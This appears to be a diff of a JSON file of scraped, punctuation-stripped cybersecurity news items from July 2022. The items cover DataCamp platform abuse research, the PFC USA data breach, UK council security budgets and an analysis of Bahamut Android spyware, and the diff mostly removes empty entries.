         "text": "Security researchers are warning that hackers can abuse online programming learning platforms to remotely launch cyberattacks steal data and scan for vulnerable devices simply by using a web browserAt least one such platform known as DataCamp allows threat actors to compile malicious tools host or distribute malware and connect to external servicesDataCamp provides integrated development environments IDEs to close to 10 million users that want to learn data science using various programming languages and technologies R Python Shell Excel Git SQLAs part of the platform DataCamp users gain access to their own personal workspace that includes an IDE for practicing and executing custom code uploading files and connecting to databasesThe IDE also allows users to import Python libraries download and compile respositories and then execute compiled programs In other words anything an industrious threat actor needs to launch a remote attack directly from within the DataCamp platformAfter responding to an incident where a threat actor might have used DataCamp's resources to hide the origin of the attack researchers at cybersecurity company Profero decided to investigate this scenarioThey found that DataCamp's advanced online Python IDE offered users the ability to install third-party modules that allowed connecting to an Amazon S3 storage bucketThe researcher says that the activity coming from DataCamp is likely to pass by undetected and even those who further inspect the connection would hit a dead end because there is no known definitive source listing the IP range of DatacampThe investigation into this attack scenario went further and the researchers tried to import or install tools typically used in a cyberattack such as the Nmap network mapping toolIt was not possible to install Nmap directly but DataCamp allowed compiling it and executing the binary from the compilation directoryProfero's Incident Response Team also tested if they couldupload files using a terminal and get a link to share them They were able toupload EICAR - the standard file for testing detection from antivirus solutions and get a link for distributing itProfero's report today notes that the download link could be used to download additional malware to an infected system by using a simple web requestFurthermore these download links can be abused in other types of attacks such as hosting malware for phishing attacks or by malware to download additional payloadsBleepingComputer reached out to DataCamp for comment about Profero's research and a spokesperson said that there is inherently a risk that some individuals may attempt to abuse our systems because the platform provides a live computing environmentDataCamp states in their Terms of Service that abusing the platform is forbidden but threat actors are not the users to respect the rulesDataCamp said that they have taken reasonable measures to prevent abuse from impacting other users on the platform and that they are monitoring their systems for misbehaviorIn addition in order to prevent individual malpractice we have implemented a responsible disclosure policy and monitor our systems on an ongoing basis to mitigate risk - DataCampAlthough Profero did not extend their research to other learning platforms the researchers believe that DataCamp is not the only one that hackers could abuseThe restrictions apply to resources that can be used bandwidth and blocking potentially malicious applicationsThe Binder representative said that they are willing to add more safeguards in the BinderHub source code if Profero's report shows that further steps are necessaryProfero encourages providers of online code learningplatforms to keep a list of outgoing customer traffic gateways and make it publicly accessible so that defenders can locate the origin of an attack should it be the caseThe company's recommendation also includes implementing a safe and easy way for users to submit abuse reports"
-    },
-    {
-        "time": "2022-07-08",
-        "title": "httpswwwcyberscoopcomrussian-information-operations-dividing-west-ukraine",
-        "text": ""
     },
     {
         "time": "2022-07-08",
@@ -806,11 +721,6 @@
     },
     {
         "time": "2022-07-07",
-        "title": "httpsportswiggernetdaily-swigatlassian-patches-full-read-ssrf-in-jira",
-        "text": ""
-    },
-    {
-        "time": "2022-07-07",
         "title": "Data Breach at PFC USA Impacts Patients of 650 Healthcare Providers - SecurityWeek",
         "text": "Hi what are you looking forJust ahead of the 4th of July weekend accounts receivable management firm Professional Finance Company PFC USA started sending out data breach notification letters to patients of over 650 healthcare providers across the countryByFlipboardRedditWhatsappWhatsappEmailIonut Arghire is an international correspondent for SecurityWeekSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats trends and technology along with insightful columns from industry expertsJoin us as we delve into the transformative potential of AI predictive ChatGPT-like tools and automation to detect and defend against cyberattacksAs cybersecurity breaches and incidents escalate the cyber insurance ecosystem is undergoing rapid and transformational change FlipboardRedditWhatsappWhatsappEmailThe changing nature of what we still generally call ransomware will continue through 2023 driven by three primary conditionsAs it evolves web3 will contain and increase all the security issues of web2 and perhaps add a few moreA recently disclosed vBulletin vulnerability which had a zero-day status for roughly two days last week was exploited in a hacker attack targeting theLuxury retailer Neiman Marcus Group informed some customers last week that their online accounts had been breached by hackersZendesk is informing customers about a data breach that started with an SMS phishing campaign targeting the companys employeesSatellite TV giant Dish Network confirmed that a recent outage was the result of a cyberattack and admitted that data was stolenThe release of OpenAIs ChatGPT in late 2022 has demonstrated the potential of AI for both good and badA new study by McAfee and the Center for Strategic and International Studies CSIS named a staggering figure as the true annual cost ofGot a confidential news tip We want to hear from youReach a large audience of enterprise cybersecurity professionals Subscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inboxCopyright 2023 SecurityWeek a Wired Business Media Publication All Rights Reserved"
     },
@@ -860,153 +770,8 @@
         "text": "Deputy Editor Infosecurity MagazineAn investigation into cybersecurity at UK public services revealed a large disparity in defense budgets hundreds of website vulnerabilities and staff email addresses and passwords at one council posted in full onlineThe ITV News investigation found that one UK council spent only 32000 a year on cybersecurity By comparison another council with a smaller population had an annual cybersecurity budget of 1mover 30 times largerThe investigation also revealed that one hospital had only put aside 10000 a year towards cybersecurityThe investigation is withholding the names of the public institutionsITV News found that the cyber-attacks had caused real-life problems includingThe investigation noted that various experts expressed concern to ITV News about a lack of clarity and standards for public services regarding cybersecurityThe local authority with the worst record for human-caused data breaches was Hampshire County Council with 3759 incidents since 2016 This included 902 breaches in the year 201819Gloucestershire County Council had the next worst record suffering 2723 breaches in this period It also experienced the largest increase from 201617 90 to 202021 1004 of any UK council a rise of 1016The public sector is a potential gold mine for cyber-criminals with personal and health information being a target for identity fraud and broader financial crime The ITV investigation into public sector spending revealed a disparity in defense budgets and many vulnerabilities with one hospital spending just 10000 a year on cybersecurityCyber-attacks pose a real threat to the public sectorAccording to ICO data analyzed by CybSafe local government accounted for 10 of all cyber incidents in 2021 and 5 of total cyber-attacks an almost 50 increase from the number of attacks in 2020Realistic funding along with the right strategies is vital to safeguard employees and members of the public Public sector organizations must take steps to not only raise awareness of new and emerging cyber threats but also provide effective security training and supportBy equipping and empowering employees with the knowledge and know-how to spot and avoid attacks the UKs local authorities will be able to remain one step ahead This isnt just about technical defenses its about supporting people in their day-to-day lives"
     },
     {
-        "time": "2022-07-05",
-        "title": "httpswwwitmediacojpnewsarticles220704news130html",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwcysecuritynews202207alert-teen-hackers-are-using-discord-tohtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwbleepingcomputercomnewssecurityastralocker-ransomware-shuts-down-and-releases-decryptors",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwbleepingcomputercomnewssecuritygoogle-patches-new-chrome-zero-day-flaw-exploited-in-attacks",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwcysecuritynews202207gitlab-patches-critical-rce-flaw-inhtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwinfosecurity-magazinecomnewsnato-rapid-cyber-responseutmsourcetwitterfeedutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwbleepingcomputercomnewssecuritydjango-fixes-sql-injection-vulnerability-in-new-releases",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwinfosecurity-magazinecomnewsbritish-army-social-media-accountsutmsourcetwitterfeedutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-05",
-        "title": "httpswwwcysecuritynews202207lazarus-group-responsible-for-100mhtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "APT -",
-        "text": "2022-06-30 APTPatchworkCVE-2017-11882Patchwork2015APTAPTDropping ElephantChinastratsAPT-C-09Quilted TigerATK 11ITReduction of working daysrtfRecruitment of officials on deputation basis2rtfCNICCVE-2017-11882 OfficeCVE-2017-11882 OfficeshellcodeshellcodeOneDriveexecmdPatchworkESM"
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwbleepingcomputercomnewssecurityprivacy-protection-agency-seizes-servers-of-hacked-travel-company",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwcysecuritynews202207users-get-directly-infected-byhtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwbleepingcomputercomnewssecurityfree-smartphone-stalkerware-detection-tool-gets-dedicated-hub",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwcysecuritynews202207google-blocks-malicious-domains-used-byhtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwsecurityweekcomgoogle-half-2022s-zero-days-are-variants-previous-vulnerabilities",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwcysecuritynews202207microsoft-detects-raspberry-robin-wormhtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwthetechoutlookcomnewstechnologysecuritythe-anonymous-and-it-army-of-ukraine-claim-to-hack-lte-routers-with-88-websites-of-the-russian-federation",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwcysecuritynews202207susceptible-apis-costing-organizationshtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-04",
-        "title": "httpswwwkasperskycomblogphishing-qr-code-attack-on-qq-users44767utmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
         "time": "2022-07-01",
         "title": "Cyble Bahamut Android Malware returns with New Spying Capabilities",
         "text": "Bahamut is a well-known Advanced Persistent Threat APT group that was first discovered in 2017 The Bahamut group was involved in various phishing campaigns that were delivering malware targeting the Middle East and South AsiaThe Bahamut group plans their attack on the target stays in the wild for a while allows their attack to affect many individuals and organizations and finally steals their dataAfter their previous attack the Threat Actors TAs behind Bahamut stayed silent for about a year and came back with a new strategy for their current campaign The group has continuously kept changing its mode of attack and in the past few years it is increasingly shifting its focus to targeting mobile devicesThis indicates that the TA has invested time in developing a well-designed phishing website to attract the victim to download the malwareAlong with the secure chat phishing website we have observed that Bahamut Spyware is being distributed through obscene sites hxxpswwwiminglechatdeWhile comparing the old and new variants of Bahamut Android Spyware we observed that the TA has modified their code in the new variant and added extra modules specifically targeting messaging applications such as Viber Imo Signal Telegram and many more wherein the old variant of the malicious app was collecting only Personally Identifiable Information PII such as contacts SMS data call logs etcThe below image showcases the comparison and the extra module added to collect information from different messaging appsAPK Metadata InformationFigure 4 shows the metadata information of the applicationManifest DescriptionThe malicious application mentions 24 permissions of which the TA exploits 9 The harmful permissions requested by the malware areSource Code ReviewInstalling the malware prompts the user to enable a few permissions and Accessibility Service Once the victim grants these permissions the malware abuses the Accessibility Service to fetch data from the targeted messaging applicationsThe malware then checks for the targeted applications package name It uses the Accessibility API to fetch text from the current screen and stores it in a local database as shown belowBelow is the list of messaging applications targeted by the malware to collect the dataAfter collecting data from these messaging apps the malware sends the stolen data to Command and Control CC server The code present in the below image depicts the sameAlong with collecting the data from messaging applications the malware executes the below spyware activitiesThe figure below shows the CC server and endpoints used by the malware to send the stolen dataRecently many malware families and APT groups have been observed in the wild attacking specific targets and performing malicious activities then disappearing for some time Bahamut malware follows the same cybercrime footprintBahamut malware was initially observed last year with sophisticated spying capabilities and interestingly it has reappeared with new additional code which collects messaging applications data used by the victim The agenda behind the malware distribution is very clear to spy on the targeted entityOver the next few years we may observe a change in the activities of the Bahamut APT group with different targets enhanced techniques and distribution modesWe have listed some essential cybersecurity best practices that create the first line of control against attackers We recommend that our readers follow the best practices given belowHow to prevent malware infectionHow to identify whether you are infectedWhat to do when you are infectedWhat to do in case of any fraudulent transactionWhat should banks do to protect their customersMITRE ATTCK TechniquesIndicators of Compromise IOCsCyble's research team has found an uptick in phishing campaigns targeting multiple organizations including financial institutes by abusing the ngrok platform a secure and introspectableTwo Android spyware strains named Hornbill and SunBird were recently discovered with possible connections to the advanced persistent threat APT group called Confucius The groupComments are closed"
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpstherecordmedianorth-korea-accused-of-orchestrating-100-million-harmony-crypto-hack",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpswwwinfosecurity-magazinecomnewscanadian-worker-guilty-netwalkerutmsourcetwitterfeedutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpswwwcisagovuscertncasalertsaa22-181a",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpstherecordmedianorway-accuses-pro-russian-hackers-of-launching-wave-of-ddos-attacks",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpstherecordmediasudan-government-shuts-off-internet-ahead-of-anti-coup-protest",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpsthehackernewscom202206google-blocks-dozens-of-malicioushtml",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpswwwbleepingcomputercomnewssecurityukraine-targeted-by-almost-800-cyberattacks-since-the-war-started",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpswwwbleepingcomputercomnewssecurityxfiles-info-stealing-malware-adds-support-for-follina-delivery",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpsthehackernewscom202206us-fcc-commissioner-asks-apple-andhtml",
-        "text": ""
-    },
-    {
-        "time": "2022-07-01",
-        "title": "httpswwwbleepingcomputercomnewssecurityopensea-discloses-data-breach-warns-users-of-phishing-attacks",
-        "text": ""
     }
 ]
